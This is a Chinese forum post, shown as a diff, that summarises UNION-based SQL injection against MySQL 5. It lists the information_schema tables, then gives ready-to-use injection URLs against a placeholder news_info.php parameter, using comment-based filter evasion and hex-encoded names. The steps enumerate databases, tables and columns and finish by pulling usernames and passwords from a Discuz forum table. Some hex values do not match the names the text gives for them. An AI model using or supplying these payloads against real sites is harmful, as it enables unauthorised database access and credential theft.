@@ -1,0 +1,107 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+Mysql5注射总结
+D8888D主贴内容-------------------------------------------------------
+此文是看了 Mysql5注射技巧 文章后，自己把代码理了一下。。
+希望对大家有用，转载请注明 文章来自 刀客'blog
+blog新开，欢迎大家友情链接
+
+mysql> use information_schema;
+
+Database changed
+
+mysql> show tables;
+
++---------------------------------------+
+
+| Tables_in_information_schema |
+
++---------------------------------------+
+
+| CHARACTER_SETS |
+
+| COLLATIONS |
+
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+
+| COLUMNS |
+
+| COLUMN_PRIVILEGES |
+
+| KEY_COLUMN_USAGE |
+
+| ROUTINES |
+
+| SCHEMATA |
+
+| SCHEMA_PRIVILEGES |
+
+| STATISTICS |
+
+| TABLES |
+
+| TABLE_CONSTRAINTS |
+
+| TABLE_PRIVILEGES |
+
+| TRIGGERS |
+
+| USER_PRIVILEGES |
+
+| VIEWS |
+
++---------------------------------------+
+
+如果读者有兴趣可以自己装一个mysql5研究一下这几个表存储的信息，我这里只挑注射中可以用到的几个表。　
+
+| SCHEMATA ――>存储数据库名的，
+
+|——>关键字段：SCHEMA_NAME，表示数据库名称
+
+| TABLES ――>存储表名的
+
+|——>关键字段：TABLE_SCHEMA表示表所属的数据库名称；
+
+TABLE_NAME表示表的名称
+
+| COLUMNS ――>存储字段名的
+
+|——>关键字段：TABLE_SCHEMA表示表所属的数据库名称；
+
+TABLE_NAME表示所属的表的名称
+
+　　　　　　　　 　COLUMN_NAME表示字段名 discuz cdb_virtualforums
+
+可以看到，我们只要通过注射点构造查询语句遍相关字段，就可以得到我们想要的信息了。
+
+语句(1):mysql> select * from information_schema.schemata    从mysql5系统库中查询所有的数据库
+
+对应注射语句:xx.com/news_info.php?wid=-1/**/union/**/select/**/1,SCHEMA_NAME,3,4,5,6,7,8,9,10,11,12,13,14,15 from/**/information_schema.SCHEMATA limit 17,1/*
+
+注（猜数据库,可以通过不断递增limit的第一个参数查询到所有的数据库名）
+
+
+语句(2)mysql> select table_name from information_schema.tables where table_schema=0x646
+97363757A      从mysql5系统库中查询discuz这个库中所有的表名，其中0x646
+97363757A 是discuz的十六进制
+
+注：后面可以加 limit 1,1前面的1可以递增，只显示一条信息
+
+对应注射语句:xx.com/news_info.php?wid=-1/**/union/**/select/**/1,TABLE_NAME,3,4,5,6,7,8,9,10,11,12,13,14,15/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA=0x77656262617365/**/limit/**/11,1
+
+
+语句(3)mysql> select column_name from information_schema.columns where table_name=0x636
+4625F7669727475616C666F72756D73;   从mysql5系统库中查询cdb_virtualforums 表中所有的字段
+
+注：后面可以加 limit 1,1前面的1可以递增，只显示一条信息
+
+对应注射语句：tg_adminuser十六进制编码为0x74675F61646D696E75736572，依次查找该表里面的字段名，如
+xx.com/news_info.php?wid=-1/**/union/**/select/**/1,COLUMN_NAME,3,4,5,6,7,8,9,10,11,12,13,14,15/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME=0x74675F61646D696E75736572/**/limit/**/1,1
+
+
+语句(4)select name from discuz.cdb_virtualforums 从mysql5系统库中查询discuz数据库中表(cdb_virtualforums)中的字段（name） 的 值
+
+注：后面可以加 limit 1,1前面的1可以递增，只显示一条信息
+
+对应注射语句:xx.com/news_info.php?wid=-1/**/union/**/select/**/1,username,3,4,password,6,7,8,9,10,11,12,13,14,15/**/from/**/discuz.cdb_virtualforums
